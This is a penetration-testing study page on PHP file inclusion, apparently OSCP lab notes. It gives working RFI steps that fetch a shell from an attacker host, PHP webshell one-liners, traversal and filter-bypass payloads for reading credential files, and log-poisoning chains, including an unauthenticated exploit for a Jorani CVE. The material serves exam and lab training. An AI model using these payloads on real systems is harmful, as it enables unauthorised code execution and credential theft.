---
title: "File Inclusion"
slug: file-inclusion
category: notes
handbook: oscp
tags: ["file-inclusion"]
draft: false
pubDatetime: 2026-07-21T21:42:14+03:00
modDatetime: 2026-09-13T20:51:50+03:00
description: "A file inclusion bug is a script that builds an `include`/`require` path from user input."
---
A file inclusion bug is a script that builds an `include`/`require` path from user input. When the input reaches the filesystem it is local file inclusion (LFI); when the runtime can also fetch a remote URL it is remote file inclusion (RFI). RFI is the stronger one, since a remote PHP file is executed in the include context and gives direct code execution.

## Spot the Pattern

Parameters that name a file, page, or template are the candidates:

```
image.php?img=...
index.php?page=...
?file=...  ?template=...  ?lang=...
```

The vulnerable code concatenates the parameter into an include with no whitelist:

```php
include($_GET['img']);        // whatever img points at gets included and run
```

## RFI

RFI needs PHP configured to open remote URLs. Both settings are in php.ini:

```ini
allow_url_fopen = On     # PHP may open URLs as files
allow_url_include = On   # include()/require() may take a URL  (off by default since PHP 5.2)
```

`allow_url_include` is the one that matters and is off by default, so RFI is rarer than LFI. When it is on, host a PHP payload on Kali and point the parameter at it. The target fetches and executes it:

```bash
# Kali: serve the payload
sudo python3 -m http.server 80
```

```
http://TARGET/image.php?img=http://KALI/shell.php
```

The payload is any PHP that runs on inclusion. A one-liner confirms execution before dropping a full shell:

```php
<?php system($_GET['c']); ?>     // then ?img=...&c=id
```

For a shell, host a PHP reverse shell (pentestmonkey `php-reverse-shell.php` with the IP and port edited, or `msfvenom -p php/reverse_php`) and catch it with `nc -lvnp PORT`. See [Reverse Shells](/collections/oscp/reverse-shells). On Snookums the `img` parameter of `image.php` was a straight RFI (php.ini had `allow_url_include=On`), and a hosted `shell.php` returned an `apache` shell. On Slort, `site/index.php?page=` first returned the Windows hosts file through `C:\Windows\System32\drivers\etc\hosts`, then accepted `http://KALI/revshell.php` and returned a Windows shell. A failed `/etc/hosts` read only reflected the target operating system, not a broken inclusion.

A `.php` extension on the remote file does not matter for how the target treats it, since it is executed by the including script, not served. Hosting it as `shell.txt` works the same and avoids the local server executing it.

## LFI

When only local paths resolve, the include still reads files off the target. Direct reads first:

```
?page=/etc/passwd
?page=../../../../etc/passwd        # traverse out of the app directory
```

PHP wrappers extend LFI. `php://filter` base64-encodes source so it comes back instead of executing, which leaks credentials from config files:

```
?page=php://filter/convert.base64-encode/resource=db.php
```

Turning LFI into code execution means getting PHP into a file the include will read, covered below. Session files (`/var/lib/php/sessions/sess_<PHPSESSID>`) and uploaded files work the same way when the path is guessable. An include ignores the extension, so an uploaded `.jpg` full of PHP executes and no upload filter has to be beaten at all, see [File Upload](/collections/oscp/file-upload).

## Traversal read and write without inclusion

Not every path bug reaches `include()`. A file-download endpoint, a directory listing, or a file manager builds a filesystem path from user input and reads or writes it directly, with no code execution but full arbitrary read of anything the app user can reach, and, when an upload shares the same path handling, arbitrary write.

When the endpoint takes more than one path parameter, test each separately. A base-directory parameter and a filename parameter are often sanitised differently, and only one traverses:

```
?cwd=<base dir>&file=<name>&download=true
```

On XposedAPI a `/logs?file=` log-viewer endpoint read whatever path it was given with no filtering at all, straight arbitrary file read, with no code execution needed since the endpoint's whole job is to display file contents back to the caller. That endpoint sat behind an access check that trusted a client-supplied `X-Forwarded-For` header to decide whether the request "came from localhost"; setting `X-Forwarded-For: localhost` satisfied it outright. Any endpoint gated on the apparent source IP is worth testing this way before assuming it is actually unreachable.

On Boolean the `file` parameter was sanitised (`file=../../../../etc/hosts` returned the listing unchanged) while the `cwd` base-directory parameter traversed. A single-pass filter that strips one `../` is defeated by interleaving or doubling the sequence so a `../` survives the removal:

```
cwd=./.././.././.././.././../etc/        # interleaved ./ walks up past a naive strip
cwd=....//....//....//etc/               # doubled, the inner ../ is removed leaving ../
```

The server is not the only thing that can eat a `../` before it counts: `curl` and `wget` both normalize dot-segments out of a URL path client-side before the request is ever sent, so a literal `../` typed by hand can vanish even when the endpoint itself is fully vulnerable. `curl --path-as-is`, or percent-encoding the slashes (`..%2F` instead of `../`, which survives client-side normalization and is decoded back to a traversal by the server), gets the real payload onto the wire. On Fanatastic, Grafana's plugin-path traversal (CVE-2021-43798) read `/etc/passwd` fine through a PoC script that builds the request raw, but the same traversal against `grafana.db` typed into `curl`/`wget` by hand silently returned the site's `/login` page instead, with no error pointing at the real cause.

Read targets are the usual credential and key files (`/etc/passwd`, app config, `/home/<user>/.ssh/`). When the same feature uploads, the write side is the stronger primitive: drop an `authorized_keys` into a writable `.ssh` for a login, see [SSH Key Access](/collections/oscp/ssh-key-access).

Where a config file sits is decided by how the product was installed, and guessing that wrong looks identical to the traversal itself being broken. `Could not find the file` on a guessed config path is worth another guess before writing the primitive off. On Apex, Responsive FileManager's `get_file` missed twice against OpenEMR's `sqlconf.php`, `/var/www/html/openemr/sites/default/` then `/var/www/html/openemr/library/`, both `Could not find the file`, before dropping the assumed `html/` segment matched the box's real layout (confirmed later from a shell's own `pwd`).

Finding the file and getting its content back are separate problems, and fixing the first does not automatically fix the second. Once the path was right, `copy_cut` + `paste_clipboard` placed a copy on disk, but reading it back through FileManager's own `/source/<path>` endpoint kept returning a plain `404` regardless of path, specifically for this `.php` file, the exact mechanism never pinned down. Guessing the `paste_clipboard` destination by hand (`docs`, `sources`, several case and pluralization variants) also went nowhere, "not writable" or "Wrong path", where the already-proven-correct directory from an earlier upload primitive would have worked immediately; a public PoC's own copy+paste routine succeeded there where the manual guesses hadn't. When an app's own read-back endpoint won't serve a file for no path-related reason, check whether the write landed somewhere also reachable over an unrelated protocol, see [SMB Enumeration](/collections/oscp/smb-enumeration#what-to-look-for).

## Log Poisoning

The include executes whatever PHP it reads, so any file whose contents are partly attacker controlled is a code execution primitive. The steps do not change:

1. Find a field the target writes into a file verbatim.
2. Send PHP in that field.
3. Include the file and pass a command.

Web server logs are the textbook target, since `User-Agent` is logged unfiltered:

```bash
curl -H 'User-Agent: <?php system($_GET["c"]); ?>' http://TARGET/
```

```
?page=../../../../var/log/apache2/access.log&c=id
```

The catch is readability. On Debian and Ubuntu `/var/log/apache2/` is `root:adm 0640`, so the web user usually cannot read its own access log and the include comes back empty. `/var/log/nginx/access.log` is the same.

Application logs are the better target, because the app writes them as the web user and can therefore read them back. Framework log paths are fixed and the filenames are usually dated, so the target file is known rather than guessed. CodeIgniter writes `application/logs/log-YYYY-MM-DD.php`, and it logs failed logins with the submitted username, which makes the username field the injection point. The protective header CodeIgniter prepends to a `.php` log (`defined('BASEPATH') OR exit('No direct script access allowed')`) does not stop this: the include runs from inside the framework, where `BASEPATH` is defined, so the guard passes and the appended payload executes.

Prefer a header-driven payload over `$_GET`:

```php
<?php if(isset($_SERVER['HTTP_X_CMD'])){system(base64_decode($_SERVER['HTTP_X_CMD']));} ?>
```

Gating on `isset` keeps the poisoned log inert for ordinary requests, and base64 keeps quotes, spaces, and slashes out of the request line. Passing commands in a header also stops each command from being written back into the log.

On Jordak this chain was the whole foothold, as CVE-2023-26469 in Jorani. `POST /session/login` carries the PHP payload in the `login` field and `language=../../application/logs`; the language value is kept with the session and used as a path component when the app resolves a help page, so `GET /pages/view/log-YYYY-MM-DD` includes the poisoned log instead of a view. It is unauthenticated: the login attempt only has to fail and be logged, and `X-REQUESTED-WITH: XMLHttpRequest` keeps the request from being redirected to the login page.

## Where This Sits

File inclusion is a web-app foothold, feeding the same post-exploitation flow as [Command Injection](/collections/oscp/command-injection): confirm execution, get a shell via [Reverse Shells](/collections/oscp/reverse-shells), then read app configs for credentials ([Credential Hunting](/collections/oscp/credential-hunting)). Try the parameter by hand before reaching for a version-specific public exploit, which may target a different release and never fire.
